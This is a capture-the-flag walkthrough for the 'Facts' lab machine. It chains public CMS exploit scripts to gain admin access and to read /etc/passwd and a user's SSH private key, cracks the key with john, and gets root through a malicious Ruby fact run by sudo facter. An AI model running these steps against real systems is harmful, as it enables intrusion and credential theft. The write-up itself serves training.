## Walkthrough for Facts

---

### Recon

As always I start with the tried and true generic scripts and service version enumeration scan via nmap.
```bash
nmap -sC -sV facts.htb
```

| Port | Service | Notes                                     |
|------|---------|-------------------------------------------|
| 22   | SSH    | (very important later)                    |
| 80   | HTTP   | http://facts.htb |

*Add `facts.htb` to `/etc/hosts` like always since DNS will not work without:*

```bash
echo "<ip> facts.htb" | sudo tee -a /etc/hosts
```

Open the web ui at `http://facts.htb` and you should be met with the landing page.
![](../assets/factslogin.jpg)

This is where you would begin your exploration to find any vectors for attack. After poking around for a few minutes I checked to see if an admin panel was accessible. And it was very quickly found at facts.htb/admin.
I tried a few basic user/pass combinations of weak and default creds but nothing popped. I clicked register new user with test creds and that let me log into the admin portal with least priv.

From there I was able to see that the site was running chameleon CMS v2.9.0 so I immediately looked to see if there were any existing vulns.

---

### Elevate to `admin` – CVE‑2025‑20304

After digging around I found this CVE and an exploitation script that turns any regular user into an `admin` due to an insecure mass-assignment pattern. (https://github.com/Alien0ne/CVE-2025-2304)  
Run it with the credentials you already know (`test`).

```bash
python exp.py http://facts.htb -U test -P test
```

> **Output**
> ```
> [*] Updated User Role: admin
> ```

Now your test account has admin privs allowing you to see more of the site config.
![](../assets/adminpanel.jpg)
---

After further enumeration and exploration of the site, I couldn't find anything of particular interest so I began searching for other CVE's. Maybe there is one that requires the admin role.......
### Read `/etc/passwd` – CVE‑2024‑46987

Bingo, CVE‑2024‑46987 is an *arbitrary file read* flaw that works on Camaleon CMS 2.9.0 with user accounts that have the admin role.  
Use the  Python script from the PoC to read `/etc/passwd`.
(https://github.com/Goultarde/CVE-2024-46987)

```bash
python3 CVE-2024-46987.py -u http://facts.htb/ -l test -p test /etc/passwd
```

The output will show:

```
root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:trivia:/home/trivia:/bin/bash
william:x:1001:1001:william:/home/william:/bin/bash
```

Boom we have two useful accounts: **trivia** (uid 1000) and **william** (uid 1001).

---

### Grab the `trivia` private key

Again with CVE‑2024‑46987, fetch the private key that belongs to the `trivia` user.

```bash
python3 CVE-2024-46987.py -u http://facts.htb/ -l test -p test /home/trivia/.ssh/id_ed25519 > id_ed25519
```
![](../assets/initialexploit.jpg)
> **Important** – keep the exact line‑breaks and base64 padding.  
>  The file should start with `-----BEGIN OPENSSH PRIVATE KEY-----` and end with `-----END OPENSSH PRIVATE KEY-----`.

Make sure the key is only readable by you:

```bash
chmod 600 id_ed25519
```

---

### Crack the key password

`id_ed25519` is an **encrypted** private key.  
Convert it to John format with `ssh2john`:

```bash
ssh2john id_ed25519 > id.hash
```

Now crack the hash with `john`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id.hash
```

After a ~minute time you’ll see:

```
dragonballz (id_rsa.hash)
```
![](../assets/rsa.jpg)
Verify:

```bash
john --show id.hash
# → id_rsa.hash:dragonballz
```

---

### SSH Time

Now we can use this private key to ssh into trivia's account. If you try to ssh without the private key, you'll get permission denied.

```bash
ssh -i id_ed25519 trivia@facts.htb
```

Now you should have a shell as **trivia**.

---

### User Flag

The first flag is in William’s home directory so all you will need to do is cat it.

```bash
cat /home/william/user.txt
```

Now let's see what sudo privs Trivia has if any. As always we will check with `sudo -l` to see which commands can run as root:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/facter
```
This was an interesting find and something I have not encountered before so I did some digging.
>  Facter is part of the Puppet agent package and is used to provide consistent, structured data about a managed node. This data is sent to the Puppet Server to help compile node-specific configuration catalogs. When executed without arguments, facter outputs all available facts in a key-value format. It can also retrieve specific facts by name (e.g., facter hostname).
>  The tool supports custom facts through external scripts or data files placed in directories like /etc/facter/facts.d/ or /opt/puppetlabs/facter/facts.d/. These can be written in any language (e.g., Bash, Python, Ruby) as long as they output key-value pairs, JSON, or YAML.

The support for custom facts through scripts was an interesting feature that told me this may be the path to root. After more research about facter I find that facter has a “custom‑fact” option (`--custom-dir`). 
And it just so happens that if we provide a Ruby file that executes a shell, `facter` will run it *as root* (because the web app runs it with root privileges).

---

### RCE via Facter

Create a directory and a malicious fact file:

```bash
mkdir -p /tmp/rfacts
cat > /tmp/rfacts/evil.rb <<'EOF'
#!/usr/bin/env ruby
require 'facter'

Facter.add('reverse_shell') do
  setcode do
    exec('/bin/bash -p')
  end
end
EOF
```

Now run `facter` as root:

```bash
sudo /usr/bin/facter --custom-dir /tmp/rfacts
```

You will be dropped into a **root shell** instantly:

```
root@facts:~#
```
![](../assets/root.jpg)

---

### Ladies and Gentleman we got em. Get the root flag and prosper!

```bash
cat /root/flag.txt
```